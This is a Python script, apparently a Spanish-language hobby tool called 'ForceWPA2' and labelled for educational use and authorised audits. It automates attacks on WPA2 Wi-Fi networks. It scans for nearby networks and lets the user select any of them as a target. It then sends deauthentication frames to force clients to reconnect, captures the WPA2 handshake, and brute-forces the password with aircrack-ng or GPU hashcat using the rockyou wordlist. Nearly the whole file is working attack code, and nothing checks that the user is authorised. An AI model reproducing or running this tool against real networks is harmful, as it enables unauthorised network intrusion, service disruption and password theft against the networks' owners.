#!/usr/bin/env python3
"""
ForceWPA2 - Herramienta de auditoría WPA2 con handshake capture y brute force
Solo uso educativo y auditorías autorizadas
"""

import subprocess
import os
import sys
import time
import argparse
import signal
import re

# Colores para output
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'

def banner():
    print(f"""{BLUE}
    ╔═══════════════════════════════════════╗
    ║     ForceWPA2 - WPA2 Audit Tool       ║
    ║     GPU Ready | Handshake Capture     ║
    ╚═══════════════════════════════════════╝
    {RESET}""")

def run_cmd(cmd, shell=True):
    """Ejecuta comando y retorna output"""
    try:
        result = subprocess.run(cmd, shell=shell, capture_output=True, text=True)
        return result.stdout, result.stderr, result.returncode
    except Exception as e:
        return "", str(e), 1

def check_dependencies():
    """Verifica que las herramientas necesarias estén instaladas"""
    print(f"{YELLOW}[*] Verificando dependencias...{RESET}")
    deps = ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng']
    missing = []
    
    for dep in deps:
        _, _, code = run_cmd(f"which {dep}")
        if code != 0:
            missing.append(dep)
    
    # hashcat es opcional (para GPU)
    _, _, hashcat_code = run_cmd("which hashcat")
    has_hashcat = (hashcat_code == 0)
    
    if missing:
        print(f"{RED}[!] Faltan dependencias: {', '.join(missing)}{RESET}")
        print(f"{YELLOW}[*] Instalar con: sudo apt install {' '.join(missing)}{RESET}")
        return False
    
    print(f"{GREEN}[+] Aircrack-ng suite lista{RESET}")
    if has_hashcat:
        print(f"{GREEN}[+] Hashcat disponible (soporte GPU activado){RESET}")
    else:
        print(f"{YELLOW}[!] Hashcat no instalado - GPU mode no disponible{RESET}")
    return True

def enable_monitor_mode(interface):
    """Activa modo monitor en la interfaz"""
    print(f"{YELLOW}[*] Activando modo monitor en {interface}...{RESET}")
    
    # Matar procesos que interfieren
    run_cmd("sudo airmon-ng check kill")
    
    # Activar monitor mode
    stdout, stderr, code = run_cmd(f"sudo airmon-ng start {interface}")
    
    if code != 0:
        print(f"{RED}[!] Error al activar modo monitor{RESET}")
        return None
    
    # Buscar nombre de la interfaz monitor (normalmente wlan0mon)
    match = re.search(r'(\w+mon)', stdout)
    if match:
        mon_iface = match.group(1)
        print(f"{GREEN}[+] Modo monitor activado: {mon_iface}{RESET}")
        return mon_iface
    
    # Fallback
    if interface.endswith('mon'):
        return interface
    return f"{interface}mon"

def disable_monitor_mode(interface):
    """Desactiva modo monitor"""
    print(f"{YELLOW}[*] Desactivando modo monitor...{RESET}")
    run_cmd(f"sudo airmon-ng stop {interface}")
    run_cmd("sudo systemctl restart NetworkManager")
    print(f"{GREEN}[+] Modo monitor desactivado{RESET}")

def scan_networks(mon_iface, timeout=15):
    """Escanea redes WiFi y muestra resultados"""
    print(f"{YELLOW}[*] Escaneando redes durante {timeout} segundos...{RESET}")
    
    # Ejecutar airodump para escanear
    cmd = f"sudo timeout {timeout} airodump-ng {mon_iface} --output-format csv -w /tmp/scan"
    run_cmd(cmd)
    
    # Parsear resultados
    networks = []
    try:
        with open('/tmp/scan-01.csv', 'r') as f:
            for line in f:
                if line.startswith(' BSSID') or 'Station' in line or 'Probe' in line:
                    continue
                parts = line.split(',')
                if len(parts) > 13 and parts[0].strip() and ':' in parts[0]:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    essid = parts[13].strip() if len(parts) > 13 else "(hidden)"
                    if essid and essid != '(hidden)':
                        networks.append({
                            'bssid': bssid,
                            'channel': channel,
                            'essid': essid
                        })
    except:
        pass
    
    # Mostrar resultados
    if networks:
        print(f"{GREEN}[+] Redes encontradas:{RESET}")
        for i, net in enumerate(networks[:20]):
            print(f"  {i+1}. {net['essid']} - {net['bssid']} (canal {net['channel']})")
    else:
        print(f"{RED}[!] No se encontraron redes{RESET}")
    
    return networks

def capture_handshake(mon_iface, target_bssid, target_channel, target_essid, timeout=60):
    """Captura handshake WPA4"""
    print(f"{YELLOW}[*] Apuntando a {target_essid} ({target_bssid}) canal {target_channel}{RESET}")
    
    # Fijar canal
    run_cmd(f"sudo iwconfig {mon_iface} channel {target_channel}")
    
    # Iniciar captura en background
    capture_file = f"/tmp/handshake_{target_bssid.replace(':', '')}"
    cmd_capture = f"sudo airodump-ng {mon_iface} --bssid {target_bssid} -c {target_channel} -w {capture_file} --output-format pcap"
    capture_proc = subprocess.Popen(cmd_capture, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print(f"{YELLOW}[*] Esperando handshake (máx {timeout}s)...{RESET}")
    handshake_detected = False
    start_time = time.time()
    
    while time.time() - start_time < timeout:
        # Verificar si ya hay handshake en el archivo
        stdout, _, _ = run_cmd(f"sudo aircrack-ng {capture_file}-01.cap 2>/dev/null | grep -i 'handshake'")
        if '1 handshake' in stdout or 'handshake found' in stdout.lower():
            handshake_detected = True
            break
        
        # Si pasaron 5 segundos sin handshake, lanzar deauth
        if time.time() - start_time > 5 and not handshake_detected:
            print(f"{RED}[!] Sin handshake aún, lanzando deauth...{RESET}")
            run_cmd(f"sudo aireplay-ng -0 3 -a {target_bssid} {mon_iface}")
            time.sleep(2)
        
        time.sleep(2)
    
    capture_proc.terminate()
    time.sleep(1)
    
    if handshake_detected:
        print(f"{GREEN}[+] Handshake capturado! Archivo: {capture_file}-01.cap{RESET}")
        return f"{capture_file}-01.cap"
    else:
        print(f"{RED}[!] No se capturó handshake{RESET}")
        return None

def crack_with_aircrack(handshake_file, wordlist):
    """Crackea con aircrack-ng"""
    print(f"{YELLOW}[*] Probando con aircrack-ng...{RESET}")
    stdout, stderr, code = run_cmd(f"sudo aircrack-ng -w {wordlist} {handshake_file}")
    
    if 'KEY FOUND' in stdout:
        match = re.search(r'KEY FOUND! \[ (.*) \]', stdout)
        password = match.group(1) if match else "desconocida"
        print(f"{GREEN}[+] CONTRASEÑA ENCONTRADA: {password}{RESET}")
        return password
    else:
        print(f"{RED}[!] No se encontró en el diccionario{RESET}")
        return None

def crack_with_hashcat(handshake_file, wordlist, use_gpu=True):
    """Crackea con hashcat (soporte GPU)"""
    print(f"{YELLOW}[*] Convirtiendo handshake a formato hashcat...{RESET}")
    
    # Convertir .cap a .hccapx o .22000
    hc22000_file = handshake_file.replace('.cap', '.22000')
    run_cmd(f"sudo hcxpcapngtool -o {hc22000_file} {handshake_file} 2>/dev/null")
    
    if not os.path.exists(hc22000_file):
        print(f"{RED}[!] Error en conversión para hashcat{RESET}")
        return None
    
    print(f"{YELLOW}[*] Ejecutando hashcat...{RESET}")
    cmd = f"hashcat -m 22000 {hc22000_file} {wordlist}"
    if use_gpu:
        cmd += " -O"  # Optimizado para GPU
        # Detectar arquitectura GPU
        stdout, _, _ = run_cmd("hashcat -I | grep -i 'CUDA\|OpenCL'")
        if 'CUDA' in stdout:
            cmd += " -D 2"  # Usar CUDA
        elif 'OpenCL' in stdout:
            cmd += " -D 1"  # Usar OpenCL
    
    stdout, stderr, code = run_cmd(cmd)
    
    if 'Cracked' in stdout or 'Recovered' in stdout:
        # Extraer password
        cmd_show = f"hashcat -m 22000 {hc22000_file} --show"
        stdout_show, _, _ = run_cmd(cmd_show)
        parts = stdout_show.strip().split(':')
        if len(parts) >= 2:
            password = parts[1]
            print(f"{GREEN}[+] CONTRASEÑA ENCONTRADA (GPU): {password}{RESET}")
            return password
    
    print(f"{RED}[!] No se encontró en el diccionario{RESET}")
    return None

def main():
    banner()
    
    parser = argparse.ArgumentParser(description='ForceWPA2 - WPA2 Audit Tool')
    parser.add_argument('-i', '--interface', required=True, help='Interfaz WiFi (ej: wlan0)')
    parser.add_argument('-b', '--bssid', help='BSSID del objetivo (opcional, si no se especifica se escanea)')
    parser.add_argument('-c', '--channel', help='Canal del objetivo')
    parser.add_argument('-w', '--wordlist', help='Ruta al diccionario (ej: rockyou.txt)')
    parser.add_argument('--gpu', action='store_true', help='Usar hashcat con GPU')
    parser.add_argument('--scan-only', action='store_true', help='Solo escanear redes')
    
    args = parser.parse_args()
    
    if not check_dependencies():
        sys.exit(1)
    
    # Manejar Ctrl+C
    def signal_handler(sig, frame):
        print(f"\n{RED}[!] Interrumpido por usuario{RESET}")
        if 'mon_iface' in locals() and mon_iface:
            disable_monitor_mode(mon_iface)
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # Activar modo monitor
    mon_iface = enable_monitor_mode(args.interface)
    if not mon_iface:
        sys.exit(1)
    
    try:
        if args.scan_only:
            scan_networks(mon_iface)
            return
        
        # Si no dieron BSSID, escanear y pedir selección
        if not args.bssid:
            networks = scan_networks(mon_iface)
            if not networks:
                print(f"{RED}[!] No se encontraron redes{RESET}")
                return
            
            try:
                selection = int(input(f"{YELLOW}[?] Selecciona red (1-{len(networks)}): {RESET}"))
                target = networks[selection-1]
                target_bssid = target['bssid']
                target_channel = target['channel']
                target_essid = target['essid']
            except:
                print(f"{RED}[!] Selección inválida{RESET}")
                return
        else:
            target_bssid = args.bssid
            target_channel = args.channel if args.channel else input(f"{YELLOW}[?] Canal: {RESET}")
            target_essid = input(f"{YELLOW}[?] ESSID (nombre de red): {RESET}")
        
        # Capturar handshake
        handshake_file = capture_handshake(mon_iface, target_bssid, target_channel, target_essid)
        
        if not handshake_file:
            print(f"{RED}[!] No se pudo capturar handshake{RESET}")
            return
        
        # Diccionario por defecto
        wordlist = args.wordlist
        if not wordlist or not os.path.exists(wordlist):
            default_wordlists = [
                '/usr/share/wordlists/rockyou.txt',
                './wordlists/rockyou.txt',
                '/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt'
            ]
            for wl in default_wordlists:
                if os.path.exists(wl):
                    wordlist = wl
                    print(f"{YELLOW}[*] Usando diccionario por defecto: {wordlist}{RESET}")
                    break
        
        if not wordlist or not os.path.exists(wordlist):
            print(f"{RED}[!] No se encontró diccionario. Especifica uno con -w{RESET}")
            print(f"{YELLOW}[*] Descargar rockyou.txt: wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt{RESET}")
            return
        
        # Elegir método de crackeo
        if args.gpu:
            password = crack_with_hashcat(handshake_file, wordlist, use_gpu=True)
        else:
            password = crack_with_aircrack(handshake_file, wordlist)
            
            # Si falla aircrack y hashcat está disponible, ofrecer GPU
            if not password and run_cmd("which hashcat")[2] == 0:
                print(f"{YELLOW}[*] ¿Probar con hashcat (GPU)? (y/n){RESET}")
                if input().lower() == 'y':
                    password = crack_with_hashcat(handshake_file, wordlist, use_gpu=True)
        
        if password:
            print(f"{GREEN}\n[+] ¡ÉXITO! Contraseña: {password}{RESET}")
        else:
            print(f"{RED}\n[!] No se encontró la contraseña. Prueba con otro diccionario.{RESET}")
    
    finally:
        disable_monitor_mode(mon_iface)

if __name__ == "__main__":
    main()
